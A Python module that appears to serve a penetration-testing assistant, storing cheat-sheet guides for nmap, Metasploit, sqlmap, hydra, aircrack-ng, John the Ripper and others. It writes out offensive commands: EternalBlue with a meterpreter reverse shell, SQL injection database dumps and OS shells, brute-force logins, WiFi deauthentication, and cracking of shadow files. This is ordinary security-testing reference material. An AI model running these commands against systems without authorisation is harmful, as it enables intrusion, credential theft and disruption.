"""Penetration testing tool reference."""

from pentrex.tools.registry import register

TOOLS = {
    "nmap": {
        "name": "Nmap",
        "category": "Scanning",
        "description": "Network exploration and security auditing tool.",
        "common_flags": {
            "-sS": "TCP SYN scan (stealth)",
            "-sV": "Service version detection",
            "-O": "OS detection",
            "-A": "Aggressive scan (OS, version, scripts, traceroute)",
            "-p-": "Scan all 65535 ports",
            "-Pn": "Skip host discovery",
            "-sU": "UDP scan",
            "-sC": "Default script scan",
        },
        "examples": [
            {"desc": "Quick scan top 1000 ports", "cmd": "nmap 192.168.1.1"},
            {"desc": "Full TCP scan with versions", "cmd": "nmap -sS -sV -p- 192.168.1.1"},
            {"desc": "Stealth scan subnet", "cmd": "nmap -sS -Pn 192.168.1.0/24"},
            {"desc": "Vulnerability scan", "cmd": "nmap --script vuln 192.168.1.1"},
        ],
        "output_formats": ["-oN normal", "-oX XML", "-oG grepable", "-oA all formats"],
    },
    "metasploit": {
        "name": "Metasploit Framework",
        "category": "Exploitation",
        "description": "Penetration testing platform with exploits, payloads, and post-exploitation tools.",
        "key_commands": {
            "msfconsole": "Start Metasploit console",
            "search": "Find modules (search type:exploit platform:windows)",
            "use": "Select a module",
            "show options": "Display module options",
            "set": "Configure options (set RHOSTS 192.168.1.1)",
            "exploit/run": "Execute the module",
            "sessions": "List active sessions",
        },
        "examples": [
            {"desc": "Search for SMB exploits", "cmd": "search type:exploit name:smb"},
            {"desc": "Use EternalBlue", "cmd": "use exploit/windows/smb/ms17_010_eternalblue"},
            {"desc": "Set target and payload", "cmd": "set RHOSTS 192.168.1.5\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.10"},
        ],
        "post_exploitation": ["hashdump", "screenshot", "keyscan_start", "getsystem", "migrate"],
    },
    "burp_suite": {
        "name": "Burp Suite",
        "category": "Web Application",
        "description": "Integrated platform for web application security testing.",
        "components": {
            "Proxy": "Intercept and modify HTTP/S traffic",
            "Spider": "Crawl web application",
            "Scanner": "Automated vulnerability scanning (Pro)",
            "Intruder": "Automated customized attacks",
            "Repeater": "Manual request manipulation",
            "Decoder": "Encode/decode data formats",
            "Comparer": "Compare responses",
        },
        "common_tasks": [
            "Intercept login request and analyze parameters",
            "Fuzz parameters with Intruder for SQLi/XSS",
            "Test authentication bypass",
            "Analyze session management",
        ],
        "tips": [
            "Configure browser to use 127.0.0.1:8080 as proxy",
            "Install Burp CA certificate for HTTPS interception",
            "Use scope to focus on target domain",
        ],
    },
    "wireshark": {
        "name": "Wireshark",
        "category": "Network Analysis",
        "description": "Network protocol analyzer for packet capture and inspection.",
        "filters": {
            "ip.addr == 192.168.1.1": "Traffic to/from IP",
            "tcp.port == 80": "HTTP traffic",
            "http.request.method == POST": "POST requests",
            "dns": "DNS traffic only",
            "tcp.flags.syn == 1": "SYN packets",
            "!(arp or dns or icmp)": "Exclude common protocols",
        },
        "examples": [
            {"desc": "Capture on interface", "cmd": "wireshark -i eth0"},
            {"desc": "Filter HTTP traffic", "cmd": "Filter: http"},
            {"desc": "Follow TCP stream", "cmd": "Right-click packet → Follow → TCP Stream"},
            {"desc": "Export objects", "cmd": "File → Export Objects → HTTP"},
        ],
        "use_cases": [
            "Capture credentials in clear text",
            "Analyze malware C2 traffic",
            "Troubleshoot network issues",
            "Verify encryption",
        ],
    },
    "sqlmap": {
        "name": "sqlmap",
        "category": "Web Application",
        "description": "Automatic SQL injection detection and exploitation tool.",
        "key_flags": {
            "-u": "Target URL with parameter",
            "--dbs": "Enumerate databases",
            "--tables": "Enumerate tables",
            "--dump": "Dump table contents",
            "--os-shell": "Get OS shell",
            "--level": "Test level (1-5)",
            "--risk": "Risk level (1-3)",
        },
        "examples": [
            {"desc": "Test URL parameter", "cmd": "sqlmap -u 'http://target.com/page?id=1'"},
            {"desc": "List databases", "cmd": "sqlmap -u 'http://target.com/page?id=1' --dbs"},
            {"desc": "Dump users table", "cmd": "sqlmap -u 'http://target.com/page?id=1' -D dbname -T users --dump"},
            {"desc": "Use POST data", "cmd": "sqlmap -u 'http://target.com/login' --data='user=admin&pass=test'"},
        ],
        "techniques": ["Boolean-based", "Time-based", "Error-based", "UNION-based", "Stacked queries"],
    },
    "hydra": {
        "name": "Hydra",
        "category": "Password Cracking",
        "description": "Fast network logon cracker supporting numerous protocols.",
        "supported_protocols": ["SSH", "FTP", "HTTP", "HTTPS", "SMB", "RDP", "MySQL", "PostgreSQL", "VNC"],
        "key_flags": {
            "-l": "Single username",
            "-L": "Username wordlist",
            "-p": "Single password",
            "-P": "Password wordlist",
            "-t": "Parallel tasks (threads)",
            "-f": "Stop on first valid password",
            "-v": "Verbose output",
        },
        "examples": [
            {"desc": "SSH brute force", "cmd": "hydra -l admin -P passwords.txt ssh://192.168.1.1"},
            {"desc": "HTTP POST form", "cmd": "hydra -l admin -P pass.txt 192.168.1.1 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"},
            {"desc": "FTP with user list", "cmd": "hydra -L users.txt -P passwords.txt ftp://192.168.1.1"},
        ],
        "tips": [
            "Start with common credentials",
            "Use -t to control speed (avoid lockouts)",
            "Combine with username enumeration",
        ],
    },
    "aircrack": {
        "name": "Aircrack-ng",
        "category": "Wireless",
        "description": "Complete suite for WiFi security auditing.",
        "components": {
            "airmon-ng": "Enable monitor mode",
            "airodump-ng": "Packet capture",
            "aireplay-ng": "Packet injection",
            "aircrack-ng": "Key cracking",
        },
        "workflow": [
            "1. airmon-ng start wlan0",
            "2. airodump-ng wlan0mon",
            "3. airodump-ng -c [channel] --bssid [AP MAC] -w capture wlan0mon",
            "4. aireplay-ng -0 5 -a [AP MAC] wlan0mon (deauth)",
            "5. aircrack-ng -w wordlist.txt capture.cap",
        ],
        "examples": [
            {"desc": "Start monitor mode", "cmd": "airmon-ng start wlan0"},
            {"desc": "Capture handshake", "cmd": "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon"},
            {"desc": "Crack WPA", "cmd": "aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap"},
        ],
    },
    "john": {
        "name": "John the Ripper",
        "category": "Password Cracking",
        "description": "Password cracker supporting many hash types.",
        "modes": {
            "single": "Uses login info to generate guesses",
            "wordlist": "Dictionary attack",
            "incremental": "Brute force all combinations",
            "rules": "Apply mangling rules to wordlist",
        },
        "examples": [
            {"desc": "Crack shadow file", "cmd": "john --wordlist=rockyou.txt shadow.txt"},
            {"desc": "Show cracked passwords", "cmd": "john --show shadow.txt"},
            {"desc": "Specify format", "cmd": "john --format=raw-md5 hashes.txt"},
            {"desc": "Use rules", "cmd": "john --wordlist=pass.txt --rules hashes.txt"},
        ],
        "supported_formats": ["MD5", "SHA-1", "SHA-256", "NTLM", "bcrypt", "DES", "Kerberos"],
    },
}


@register(
    name="get_tool_guide",
    description="Get usage guide for a penetration testing tool.",
    parameters={
        "tool": {
            "type": "string",
            "description": "Tool name: nmap, metasploit, burp_suite, wireshark, sqlmap, hydra, aircrack, john"
        }
    }
)
def get_tool_guide(tool: str) -> dict:
    key = tool.lower().replace(" ", "_").replace("-", "_")
    
    if key not in TOOLS:
        return {
            "error": f"Tool not found: {tool}",
            "available": list(TOOLS.keys())
        }
    
    return TOOLS[key]


@register(
    name="list_tools",
    description="List all available tool guides.",
    parameters={},
    required=[]
)
def list_tools() -> dict:
    return {
        "tools": [
            {"key": k, "name": v["name"], "category": v["category"]}
            for k, v in TOOLS.items()
        ]
    }
